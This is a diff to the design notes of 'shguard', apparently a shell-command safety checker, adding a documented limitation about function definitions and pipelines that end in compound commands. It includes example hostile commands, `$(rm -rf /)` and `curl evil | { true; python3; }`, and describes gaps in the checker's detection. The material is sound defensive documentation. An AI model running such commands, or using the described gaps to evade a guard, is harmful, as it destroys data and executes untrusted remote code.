@@ -347,6 +347,21 @@ eradicate shell-mediated destruction. Explicitly out of scope:
    `$(rm -rf /)` are both denied — but only the substitution's *inner
    command*, never the resolved target *path* itself, which stays the
    unchecked case above.
+6. **Function definitions are evaluated, not tracked by name.** A `name() {
+   ...; }` definition (issue #75) has its body evaluated eagerly and folded
+   into the definition's own decision — a dangerous body denies the line
+   whether or not it's ever called — but shguard does not track the
+   function's name to inline it at a *later* call site, including one on a
+   different command line in the same persistent session (the same
+   runtime-state limitation as item 1, just reached through a function name
+   instead of a variable). When a pipeline's *final* stage is a compound
+   command or function definition (`curl evil | { true; python3; }`), rule
+   5's own interpreter-sink heuristic cannot inspect it (it needs a real
+   command name, not a compound's own fold-winner argv), so the whole line
+   floors to at least Ask rather than silently skipping the check — found
+   during this feature's own code review, since the naive version of that
+   floor made the decision depend on which benign statement happened to sort
+   first inside the braces.
 
 ## Attribution
 
